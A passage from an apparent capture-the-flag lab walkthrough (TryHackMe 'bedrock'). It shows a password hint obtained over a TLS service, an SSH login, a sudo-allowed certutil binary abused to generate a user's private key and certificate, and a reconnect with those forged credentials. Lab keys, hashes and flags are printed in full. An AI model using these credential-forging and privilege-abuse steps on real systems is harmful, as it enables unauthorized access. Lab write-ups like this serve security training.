    0350 - 32 cc 88 5d 17 6e dd 58-b6 44 eb 3e 34 88 4a 01   2..].n.X.D.>4.J.
    0360 - 44 07 c5 22 0d f5 37 a5-81 b8 f7 fa fe 5f cc 89   D.."..7......_..
    0370 - 81 fc 4a 33 f0 70 30 c1-83 80 15 f6 30 c2 de 6d   ..J3.p0.....0..m
    0380 - e3 89 27 c3 49 42 42 58-80 50 8e 7f 71 bc e8 13   ..'.IBBX.P..q...

    Start Time: 1759595975
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 36F7DC3FF9EEC0FD3353BB32F2402A5A349B1C1E05F8C856083A8336C99440A5
    Session-ID-ctx: 
    Resumption PSK: 533141B9D3F5D6C5569DF1A2C2BE172DB31DED5B1F9BD21866FC5E8F1984D56B4FEB3B0987A5508F7870F95722782258
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 80 26 66 7c 0a bb 6a 14-43 7b 11 1f de 87 99 31   .&f|..j.C{.....1
    0010 - 28 46 ef 31 88 38 8a 5c-ac 3d ef 4d a1 8c ad 26   (F.1.8.\.=.M...&
    0020 - a6 4c e7 cd 0a 36 d7 c3-5f 12 58 e1 12 8c e8 eb   .L...6.._.X.....
    0030 - ec c2 98 ff 09 48 f4 88-8d 89 f0 f4 dc 3c 9d c9   .....H.......<..
    0040 - b8 0e 6c 2a b2 f8 d5 10-97 c8 b8 50 08 26 93 4c   ..l*.......P.&..
    01b0 - 43 d9 4c 1c 01 88 1b 23-25 a4 ac fe ce da 04 20   C.L....#%...... 
    01c0 - a5 05 51 dc 2f 4b 79 fb-c1 11 7f 68 2f ee 1b f8   ..Q./Ky....h/...
    01d0 - de 9b 4e 31 05 93 8b a8-29 8d d9 af f0 a6 52 ab   ..N1....).....R.
    01e0 - a7 2d 9e d8 d1 40 47 ab-c5 f6 a8 b5 ee fa 66 9d   .-...@G.......f.
    01f0 - 55 9c 20 a0 30 5d 79 a2-c9 b7 70 33 02 d2 56 f8   U. .0]y...p3..V.
    0200 - 77 13 77 0d 05 e6 29 0d-d5 95 19 34 f0 98 56 0e   w.w...)....4..V.
    0210 - 3a 1e 04 ac d9 3d 28 31-41 50 f8 10 55 af 78 de   :....=(1AP..U.x.
    0220 - ca 45 c0 1a e8 a2 3e a1-73 ca e9 05 93 86 98 47   .E....>.s......G
    0230 - 80 4c a9 1c bb 23 59 96-ae 9e bc 59 0c e3 62 39   .L...#Y....Y..b9
    0240 - 42 c7 68 91 58 80 3c 2c-3e 98 8e 8d 61 2f b2 e5   B.h.X.<,>...a/..
    0250 - d5 af 1a 63 a9 af 42 11-9b 62 29 d6 12 10 4b 58   ...c..B..b)...KX
    0260 - 80 cf 80 c4 fa 6e 94 c1-f5 4f 40 48 f2 5d 27 86   .....n...O@H.]'.
    0270 - e4 f9 ad 53 f2 0a a3 56-cc 6c b7 d0 73 be 7f d3   ...S...V.l..s...
    0280 - c3 f8 38 39 80 4e fd fe-ff d8 3a 28 2d 6a 9a 4c   ..89.N....:(-j.L
    0290 - c1 51 4f 92 d2 c2 e4 c2-42 df f8 32 f3 e8 fa 04   .QO.....B..2....
    02a0 - 07 65 a7 13 f8 f1 dc fb-be 3d 93 8c 10 4d 6a 33   .e.......=...Mj3
    02b0 - 36 e8 bb 1b ea 97 01 e5-7d fa fd 41 c8 0f a4 a3   6.......}..A....
    02c0 - c1 fd 19 39 fd 64 96 d0-ea 0e 6e a3 6d be b1 95   ...9.d....n.m...
    02d0 - 45 cb 2e f5 45 9c f8 03-d3 b3 e9 9d 9f f2 fd ce   E...E...........
    02e0 - 57 7b 25 54 d9 f9 c2 92-fd 80 ee 1a d5 db d3 65   W{%T...........e
    02f0 - d5 44 4b 12 2b a8 64 f1-06 b0 de 83 9e 4f 4b b6   .DK.+.d......OK.
    0300 - 31 42 8f d3 fc 6e 65 45-db ca 39 bd 26 fe 49 53   1B...neE..9.&.IS
    0310 - 9b f0 af 23 1a c9 39 2c-df d6 a1 64 b0 54 8a 14   ...#..9,...d.T..
    0320 - 6c c0 0a e2 f9 f9 bd 5a-8d 2a 6a df c2 57 b2 67   l......Z.*j..W.g
    0330 - a3 fc d0 6b 0f ba b3 0b-64 64 a2 64 ac 31 68 f3   ...k....dd.d.1h.
    0340 - d5 9e 61 be 29 4b 68 ea-c6 9f 3b e8 65 c1 74 d6   ..a.)Kh...;.e.t.
    0350 - c0 a7 af f3 7b 08 f7 ae-ac a4 48 58 00 48 ed 42   ....{.....HX.H.B
    0360 - e0 45 70 b0 b8 3a 6a 9c-7f 12 d6 57 19 c3 22 3e   .Ep..:j....W..">
    0370 - 75 bd 0a 8d 15 ac 2c 23-d2 c0 26 a3 b0 17 52 81   u.....,#..&...R.
    0380 - 77 1e 34 ef 37 09 cc a8-d1 24 dc 8d 36 1c 75 47   w.4.7....$..6.uG

    Start Time: 1759595975
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 

```

## SSH

```bash
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ ssh barney@10.201.123.132
barney@10.201.123.132's password: 
Permission denied, please try again.
barney@10.201.123.132's password: 
barney@ip-10-201-123-132:~$ ls 
barney.txt
barney@ip-10-201-123-132:~$ cat barney.txt 
THM{f05780f08f0eb1de65023069d0e4c90c}
barney@ip-10-201-123-132:~$ id
uid=1001(barney) gid=1001(barney) groups=1001(barney)

```

```bash
barney@ip-10-201-123-132:~$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-201-123-132:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-201-123-132:
    (ALL : ALL) /usr/bin/certutil
barney@ip-10-201-123-132:/usr/bin$ ./certutil 

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@ip-10-201-123-132:/usr/bin$ ./certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Oct  4 15:08 barney.certificate.pem
-rw-r----- 1 root root 1678 Oct  4 15:08 barney.clientKey.pem
-rw-r----- 1 root root  894 Oct  4 15:08 barney.csr.pem
-rw-r----- 1 root root 1678 Oct  4 15:08 barney.serviceKey.pem
-rw-r----- 1 root root  976 Oct  4 15:08 fred.certificate.pem
-rw-r----- 1 root root 1674 Oct  4 15:08 fred.clientKey.pem
-rw-r----- 1 root root  898 Oct  4 15:08 fred.csr.pem
-rw-r----- 1 root root 1678 Oct  4 15:08 fred.serviceKey.pem
barney@ip-10-201-123-132:/usr/bin$ sudo ./certutil cat /usr/share/abc/certs/fred.certificate.pem
Generating credentials for user: cat (usrshareabccertsfredcertificatepem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxhFL6DNy7mh8ikgDnW2wRnGdU/ofzja6NahKVIkbn3H2QFDs
JF9KZ7CuRE14gWGaSciBN5dF+rIkxPoJQdXsMLUlSjZieYOfSo/9iyG/cpjhd3Pz
JQIV2SO8UHqQT7eCxT9KogGAyz6vRGISXadUX64o/jGHI6A8yZ7VytFpVoXVO9hI
6T1MlZZI50qYZ8jPtZlpm1yx/NkavQxT2ujRvjpxbnFEQ7zZSfD5aQnmUwC2Dngo
xH4STgeahfw2RyvhpRPaISIN+VPFTjVjH4RjjpTHcC3uPOZ+HwOKLbFpMY4iaa+i
4679ohEFqWxzf9j2WGF3VywuWhDUOaCdkAlRbwIDAQABAoIBAEVc809LDTnOn6ax
l4p/SlcxHJ63HoJSCh4WZIl8Ro8tEsbtT/Vg5aawaicDVmtA6g5iyFXWhSxJTLUq
tyk2KHPaTEfUCeJyJMuw52LdG7WfMn5pvcG9HDeh2yX39ifkpUg8ZP+dNSR4PFrf
WX0wx0yGqlZys9fXGtKk7EwN0Cz7LbJ3gO6EgR1BdOfedrq0IiCRvAVyIPTIIufz
sjafLnmnwnlKJoVgt8PcoBYtNoQoNO+eJv8bZ61Zhe634hrdDQOefAqDm5J10UHL
7mGI3Be778ZU5RNkgJNHjZKi5O9f9Iep9Oc9jjDPDa+t29iih9aUmOgXHwL9kFNU
vUIftlkCgYEA5m3DadNMO4hoJA65Ibc5ASGS+nWv/NGdPkOoW/wiLtLkayFnzmFj
mXTgDjIx7OFondXQo0rX9vU008IDdQEVfVDSzkn24odKNL6g2nRckRSnJsVKbhz1
wWdXu0IQwOWqDPCX7hXJkKG59FdgD/QHFyEZ81xBb57Zq3U6ItgJSZUCgYEA3Awv
lM9GY6Dx17BR2xCAIx6EZzE01xb86RD4JmEykxIsHenvpAA6YlNk6RYDdPYQgM4W
EFS2e8zQSTBZEs15svhLFrz4qZweKJMXeJQ7Il3/b2hYrpQr/Rc9Ji13MN2OCpzy
qwI6ANXDBgvtUYyHi9ZJ6180PSmz2Td0hBQiVfMCgYEAwVhsVUl0d6d3KnooIQAq
FqbjOsCxEEOZ2vrOM5CV5hASlUmMXoEdH1AQCBlaBtcD/xu/WqScHZ2V2/C5Ed38
+A9vMqShQWYff65MLcDhQuK/diqoz0gBdWyPEpLWl+SdEQp3kNA7Nt5ct4bxFbG+
mUuvCKHqTgxNvC46v63h7RkCgYBbU7Nrz5snPmUhX8yZXv/Pk5rgOUv0+VV+ZcyY
IT8cSy6EO9N5/Z49sN7w3nIQ2Q+AZghCPuZ9+0N3HNnbM+yOmv6PMV8DBgh+To4v
PVZNrTWWx3gG/PhE0qBOeBA/97Q8M2eEEiiAsDeBCvI0Jl8bapTDW4AS4nwCa0Gw
j6qwgQKBgQDGMX6ytvLMy95NQGSRCYR8wOUjrDN7NLpmA00fpwC6EVq3GZMOX37/
pR7G5lsA7+WCoIlTcAI6O5IXDt3N/+EE/m48QPtJfBElCRhdih0nalM0FzKygjGw
wTrbAwFAnA11eZHBQXN0/RK653oTY4se9FLVUz2pDcTQ9oHi2D8cgA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICtjCCAZ4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMDQxNzEyNTBaFw0yNTEwMDUxNzEyNTBaMC0xKzApBgNVBAMMInVz
cnNoYXJlYWJjY2VydHNmcmVkY2VydGlmaWNhdGVwZW0wggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDGEUvoM3LuaHyKSAOdbbBGcZ1T+h/ONro1qEpUiRuf
cfZAUOwkX0pnsK5ETXiBYZpJyIE3l0X6siTE+glB1ewwtSVKNmJ5g59Kj/2LIb9y
mOF3c/MlAhXZI7xQepBPt4LFP0qiAYDLPq9EYhJdp1Rfrij+MYcjoDzJntXK0WlW
hdU72EjpPUyVlkjnSphnyM+1mWmbXLH82Rq9DFPa6NG+OnFucURDvNlJ8PlpCeZT
ALYOeCjEfhJOB5qF/DZHK+GlE9ohIg35U8VONWMfhGOOlMdwLe485n4fA4otsWkx
jiJpr6Ljrv2iEQWpbHN/2PZYYXdXLC5aENQ5oJ2QCVFvAgMBAAEwDQYJKoZIhvcN
AQELBQADggEBAB4kGrElfGMekb2lY274BHKY8JRmKIbJBwm5TV9aNitS7H2/hg6Y
Ysd2UvOBwThNT6dIcJWcujVA+Rk5OzNMe8E5KyTFKhqdnquFq9ubET1f/3eKAl5n
VXce1catyG5DJq3/BOUHp/PZ6/MkTyCmtxF+/8fInoFouLqAzT2pX6Yv6WGXEzJl
RG4n1izGWospxMU8zwUm9dnNG65buOx+T4pQ8DxrxPKMxeJcOV4Bw3E8YtjcqEgy
gTI9RmIKXua8dXrgbyEpDYlpR/A8UlpfULdKxMfDFR8yS6r1oMSDI56nN4cd+/AT
Ft8aDPZhjBNAJkTQMPE4+8YZAWz58QDW3D0=
-----END CERTIFICATE-----

```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ echo "-----BEGIN RSA PRIVATE KEY-----                                 
MIIEpAIBAAKCAQEAqBjwVJncoYvKCFa2r2Ty50BLYbnUhjyQZkSLc9ZviOtzVP1T
19DoESqaszeQUI5bYj6eXoavWduhFToRgh0byyA8b6QIwFlGqmtZucBVEJAIh5lf
DAO+gH03k0tBYx9YNRNgSdOW58/eHWz9zxnmXWGAMSyUN9rBoANOLjI7eGtj1mye
8clIYcKxBCW8QkUC7eqPr76Q3OQAQ5oO48MaiHTRbTUZcCYQb1EOjpDciBgCRRgS
+kNN1n2zw3Fd1t/vn6GHh6kuNWtVRFYAm5PCzhLB7V5/YE3H5j+1iReitu4HG5Ti
eRN1lBVbl3yIjs2zHyqb4FlrQf/lOYUwrODNTQIDAQABAoIBAGdCOo+dnFxYBJku
uzXu6w+G/Udg4d474fAQdyGHPih7ifNRUmmmWIgDBdjFbw8tA5HMKXijf5/RPJhP
fWXR/7q9aKKjvwR5UuFo5EsojJiKAdNaMXqt6h3/zV3bwqTjIkooRuPS6EYp+KVW
yGqp3ErMk/ShD8Nny71BioryLHoBbvinJhLgyIWVVp30R0MABFSjNQJe4t9TUPBu
af5n/Ud6wPuEUZpIWsbF2rVdN0yP8WFmLF+e5dbuTHM/NvxeqzPVYPD0QredEj+w
FzYmCpHwKZlx3enus75UNoQrKiQPS5ZxFJdaaGpn3eFE7NqlAN8ViLiBxZDc+f/q
1GVEMvkCgYEA1J9CWhGSzQJdpLlyXjIusRbvSilWn6VCExn4zGs2ckcuagbu2YMp
+BcqWeuQFFaxMsiN8TXf3deoDqsMV0WvgQbs2V2vlBxhvbJ3OJ5+fLxN8qkZuKvC
bzmqurgWwd9mPcazxGxNmosyICaJZIYLKKh8eerOXBGXjTbbx30jTFcCgYEAymRD
JAmxgbQvseJelOuHEZjeslE1GcLHVAo1OwNQuC5mviWlaUFbJHhZXVU1LQJ9ZeFy
YE1+Jg3kSYdfrsCQ2YNmROUtBdUf9r8K1J2z/Ujbvjoixb1uJeJ+YyO13aETXk+/
8T3iIQ3/mqqIF8Oc/N+3ICCkKgUct55PzE9KLPsCgYEA1ICHdDV0HulqZiPiJjrJ
Z7ygU+KU7OHh8+1VOBk/RV/XB6j+Nu5cl9OvREemrG0olLTVCGrr33CWSnKx1teS
3MXrGiQEQ2dKWKlxdmkRyeD5lrljN6qSnU9pT0yFkiaQrNVW/c2wkfDknDVnw8wk
gvJB1ifTLzl12nEln292Q+kCgYB7s3w18pbDp9Xe63TToIEViFHUuz2xWRNrkjGm
uAgGCpZRccD/7CpAyC4WlZXCxNrQAlNd+P85UxRMvKkGrjvaNi2zvj8eaXz32xxL
h3gTPwzP38iRA47nKOAGyDTIGUM1SZkPYbtsaJnpdoFnxO+Wv0W2JT0xUZ6Tu/cZ
8PxtMQKBgQC7ngV60uEFWzyQaj0EtcSKtTphv6EHuHR4ChOSY3spTohLPHjXRANd
Uoe9Y0sexcs+ZTxD+yUQZZ8uKEP9HfZWALYSNM8+AQV1x2/CPiU39ZmqbvKeBeOX
EmcvrnerilR3x4GqyjdZwXnzlhoM+6hUneZUgFMx2LXY8p9a1rrOHA==
-----END RSA PRIVATE KEY-----"> fredkey
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ echo "-----BEGIN CERTIFICATE-----    
MIICtDCCAZwCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMDQxNzEzMTZaFw0yNTEwMDUxNzEzMTZaMCsxKTAnBgNVBAMMIHVz
cnNoYXJlYWJjY2VydHNmcmVkY2xpZW50S2V5cGVtMIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEAqBjwVJncoYvKCFa2r2Ty50BLYbnUhjyQZkSLc9ZviOtz
VP1T19DoESqaszeQUI5bYj6eXoavWduhFToRgh0byyA8b6QIwFlGqmtZucBVEJAI
h5lfDAO+gH03k0tBYx9YNRNgSdOW58/eHWz9zxnmXWGAMSyUN9rBoANOLjI7eGtj
1mye8clIYcKxBCW8QkUC7eqPr76Q3OQAQ5oO48MaiHTRbTUZcCYQb1EOjpDciBgC
RRgS+kNN1n2zw3Fd1t/vn6GHh6kuNWtVRFYAm5PCzhLB7V5/YE3H5j+1iReitu4H
G5TieRN1lBVbl3yIjs2zHyqb4FlrQf/lOYUwrODNTQIDAQABMA0GCSqGSIb3DQEB
CwUAA4IBAQA/tJX61MZPueVwHBMICi89XjJW+wfsXjYUBHT4Wy83Cn4aHTXETLEX
zs6qETlJjYWd9SVFaOBD0dCRQ4y0S2U+kDXygsRXIBhsM74psgfZwvb7qQCupDH2
uIIDapG3Y5ylKYQhazrfTHRYRzdYn8jla7hbm/VvXuw9dOtk+7wIWnxnjDknJI+X
ZIvT0esQIJugeJcX8/RvhQhr0/HevIboxwIke6QgKiVqc1j2bWpaOpt7ol4Thzss
r37GV+jFtFcGfAOCn8n0VfJAxnKlnS5aO44gnRZz65kQtR/XMQz3VZsrB57XsVw2
8BnfqRXvpl5qgT/EuJlD0x0nxe8hqmJH
-----END CERTIFICATE-----
">fredcert
```

```bash
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ openssl s_client -connect 10.201.123.132:54321 -cert fredcert -key fredkey
Connecting to 10.201.123.132
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost
verify return:1
---
Certificate chain
 0 s:CN=localhost
   i:CN=localhost
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Oct  4 15:08:05 2025 GMT; NotAfter: Oct  4 15:08:05 2026 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICrzCCAZcCFDEEo/pysNM5o9L+VEpHrLEwyG+9MA0GCSqGSIb3DQEBCwUAMBQx
EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNTEwMDQxNTA4MDVaFw0yNjEwMDQxNTA4
MDVaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBALDQV4OUbE6pwYjKPIau5HdL1NKPuUZbbW0dFBpcZa/JVioHHF7D
4n/9B3+HoCLfCwo3Y+PcvKk1d94yuoxW/IPvotFoxkrnsJ44HiKWDxI1arwAWGMj
iYJz1PnqW/ygoU2wfW3mkdvg9TYT7UF+1Nelr5G/EZcS9zbQSAyySTF7EXBdxuCy
1PzTsh3cKHKEnjvgRJDHuJ0qhRurysdxTxuUiPzJdoBtcaL3sMyxguTcphJUtyL9
4yIIX3dR6OmpSqdKCkuSbNWd1eMfQmzfyB5KTtCdVUFzf24m2D7ARzwRys4yvUcw
Dx3wYW4ZdG3fPz8nj7uoxh+82sOxcqjojwECAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEAcobC0FDt3lXuzEMwMeaXTzRODLq/6oPa2OdGcoKWieHfFM65m5d9286PiVnv
9T0OX5t79cQYaSJcfC/b2tdE8r3tqyt6y5zcHDNWX5qSbiT8iDstE2PD9WCi1De1
KsywDJU5mnknkKyha5aDDEUk9sUH6qnIwcFYjprOb/b+nc+hwIU7Z0cUjOlBO8mD
W0WXNkel0pDrMg4W1vzLgeSyx/2Tyv9coSOGD2+oBCcn76xYKrQeCa8yN/vUCYKw
ZlpYibcgSuuTE8aRzmp5DvSWeQjTJiyxHdGjDZyzK0qzQ/VEy/e7v64OrhxGk26w
uoOih5h3CWQH81p67bwfW12Dtw==
-----END CERTIFICATE-----
subject=CN=localhost
issuer=CN=localhost
---
Acceptable client certificate CA names
CN=localhost
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1348 bytes and written 2757 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 9974EC01E497160E77BD396C50BAE3380D34D165B210042A77FCDBA8E98A71ED
    Session-ID-ctx: 
    Resumption PSK: 4D4592EB47444E7C24F7545CE9C77ABA1E73033D8C4D251DC3B7722BCF68B1BFCC0EBF6FE6F5D6F9FF352458DE1A6798
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 80 26 66 7c 0a bb 6a 14-43 7b 11 1f de 87 99 31   .&f|..j.C{.....1
    0010 - 91 3b 96 0e 9f 00 83 a1-5e 48 8f 81 a3 af af 46   .;......^H.....F
    0020 - 94 ff 09 7f 2c df a5 0a-81 00 05 c3 1a f3 93 80   ....,...........
    0030 - 3f 21 66 b2 36 63 68 0d-57 89 94 cb 2a ec 0c 31   ?!f.6ch.W...*..1
    0040 - fd 4c a3 24 5a 17 92 c2-10 be 6f 5c 9e 6d 91 b7   .L.$Z.....o\.m..
    0050 - c6 a0 b2 a6 6a 15 61 c5-45 d8 07 cb a6 b9 9a 69   ....j.a.E......i
    0060 - bc 35 29 04 19 1b 33 f6-9c b4 98 d5 3d f5 ce fa   .5)...3.....=...
    0070 - 17 62 7c ba 9f 47 c7 03-3f 7e f3 81 c3 ae 3f 2b   .b|..G..?~....?+
    0080 - 73 12 ac d5 c4 cb 99 23-3e a4 56 38 0b 5f 38 6e   s......#>.V8._8n
    0090 - 6d b5 82 29 03 36 1f 31-a1 ed be a5 2a 4f 54 6f   m..).6.1....*OTo
    00a0 - 8f df c5 5a bc bc 64 c9-08 a0 82 4c e1 a1 86 15   ...Z..d....L....
    00b0 - ac f0 f3 21 67 8a b8 76-b1 a1 2b 1f d6 a9 2c 4e   ...!g..v..+...,N
    00c0 - cb 32 3e 6b d3 3d e7 c1-2a 6b 17 96 a7 41 0c fd   .2>k.=..*k...A..
    00d0 - 26 7a c4 49 b3 ac 6d 3d-25 e7 a1 1c ac df 33 ce   &z.I..m=%.....3.
    00e0 - 8b e5 ab a5 ec fc 48 1d-10 b6 e2 5c 27 08 be 59   ......H....\'..Y
    00f0 - 76 d4 fe 00 1f c8 77 2f-f3 04 fc 32 60 56 a6 c5   v.....w/...2`V..
    0100 - 9b 6d 4e 3f 9a f6 ae 1b-a7 28 1a 74 45 8c 13 df   .mN?.....(.tE...
    0110 - aa da 65 b0 10 30 a0 3d-65 9a dc 94 61 83 92 07   ..e..0.=e...a...
    0120 - 9f ac 65 1f cc 17 67 8e-7a a8 52 44 f8 46 6e 2b   ..e...g.z.RD.Fn+
    0130 - ca 40 b4 03 64 f8 32 43-9b 09 8c 0f ff 52 ba 95   .@..d.2C.....R..
    0140 - 5b f9 f2 67 7b b3 02 ab-dd 4d 97 f1 b7 01 9e 86   [..g{....M......
    0150 - 2e 37 f6 ff 0b 41 35 f8-47 78 50 fe 85 f1 cf 94   .7...A5.GxP.....
    0160 - 80 0d 81 66 e3 d9 a3 fb-b0 82 14 7b 1d cb ac 40   ...f.......{...@
    0170 - 20 03 35 69 08 4e eb 0a-6f 07 e3 3c ba 52 62 f9    .5i.N..o..<.Rb.
    0180 - 52 6e b7 25 98 95 d8 7d-5c 6c 73 7d 41 0d 32 7b   Rn.%...}\ls}A.2{
    0190 - 2c 11 9e 66 e2 3e 06 61-23 d4 8b 76 f6 34 4c aa   ,..f.>.a#..v.4L.
    01a0 - 64 5c 80 2d 3d bb cc e7-cf 92 37 e1 2d d6 aa 91   d\.-=.....7.-...
    01b0 - b8 2b b8 80 34 c2 0b 52-cf b8 1f 7a 44 0b b1 ff   .+..4..R...zD...
    01c0 - 8f 8b a2 9f 7b af 6e f5-ce 80 73 08 67 0e f8 e3   ....{.n...s.g...
    0350 - b8 2c cb b8 45 49 29 df-91 f9 eb 68 5f 55 b3 a1   .,..EI)....h_U..
    0360 - f4 3c 40 69 a6 c1 1d 50-dc 0f 52 12 64 65 ec ca   .<@i...P..R.de..
    0370 - 3b 53 0a e5 66 aa 0b 6b-1d 8e 1c d0 07 8e 17 e9   ;S..f..k........
    0380 - d5 13 85 11 a2 fa 41 e0-e7 67 7e 74 c4 c6 74 01   ......A..g~t..t.
    0390 - 7e 09 d6 bc 32 44 23 99-82 cb e4 7e 0b 16 8b 6d   ~...2D#....~...m

    Start Time: 1759598423
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 343762AF51992278FC88F5D0C05B5064D721F7E2C0A53C11EC938C29AD6F2B62
    Session-ID-ctx: 
    Resumption PSK: FF24389D47115AA63776EF5DAE0E2AF28EA13B38702583827CB7179E9DA525CBDC49179FB155D7F29B95DA4F301A433A
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 80 26 66 7c 0a bb 6a 14-43 7b 11 1f de 87 99 31   .&f|..j.C{.....1
    0010 - 64 eb d2 ec 4c 9a 82 bb-fd de 7f 93 ef 39 4e 17   d...L........9N.
    0020 - da 6e f2 dd 75 01 8b b5-14 ad 64 47 41 1c 3b 8f   .n..u.....dGA.;.
    0030 - d5 55 58 a2 e9 88 54 57-1f 82 31 c2 32 31 0a 9a   .UX...TW..1.21..
    0040 - 0e a8 a6 e9 a8 4a 48 63-c0 ab 39 84 48 e6 d9 c6   .....JHc..9.H...
    0050 - 84 b1 d2 22 c1 f0 8e 39-ec 15 90 9f b0 7a 8b 1f   ..."...9.....z..
    0060 - 74 93 71 ce 6c 0b b2 2c-ec 7b f3 6d 61 e8 58 e8   t.q.l..,.{.ma.X.
    0070 - 9b 11 db d3 09 80 e3 30-46 b7 86 90 9f af 1f c3   .......0F.......
    0080 - 2d 57 f6 bd 5e 72 10 82-e6 00 a4 72 0c 12 df 85   -W..^r.....r....
    0090 - 95 41 56 85 3a fa 64 13-3c 5d cd 0b 29 8d cd 40   .AV.:.d.<]..)..@
    00a0 - e2 38 11 47 a6 ca 1f 1c-48 0a 46 a8 45 7d dc 96   .8.G....H.F.E}..
    00b0 - 34 fd dd 90 09 24 15 f0-04 a1 0d 96 d5 33 6a fa   4....$.......3j.
    00c0 - a2 05 a3 5f 40 a0 97 d3-eb 9c ab 8d cf b3 28 ba   ..._@.........(.
    00d0 - 33 52 74 bb 21 15 44 34-db 4f 9d 09 e6 4f d6 63   3Rt.!.D4.O...O.c
    00e0 - 1d e9 e1 29 81 5b 7e 4f-0c d7 7d 5a 8e f9 2d d9   ...).[~O..}Z..-.
    00f0 - ff 2b 12 b9 55 e3 60 c4-d4 9d bf b0 62 e1 8a 2c   .+..U.`.....b..,
    0100 - b1 3a a8 5a 1e 8c ee e9-33 01 ff b9 64 1c b9 e3   .:.Z....3...d...
    0110 - 11 94 55 16 c5 90 40 3f-cc 1f f9 5b e0 9d 0e 11   ..U...@?...[....
    0120 - e4 85 3d 1f 38 aa d5 ae-18 cd 3a 02 73 c2 96 33   ..=.8.....:.s..3
    0130 - 42 51 ae ae c1 c4 a4 58-f4 7d a8 f3 a3 c3 9c 0f   BQ.....X.}......
    0360 - ec 7d 75 15 c9 75 0e 61-18 36 6d 70 c0 d9 25 fc   .}u..u.a.6mp..%.
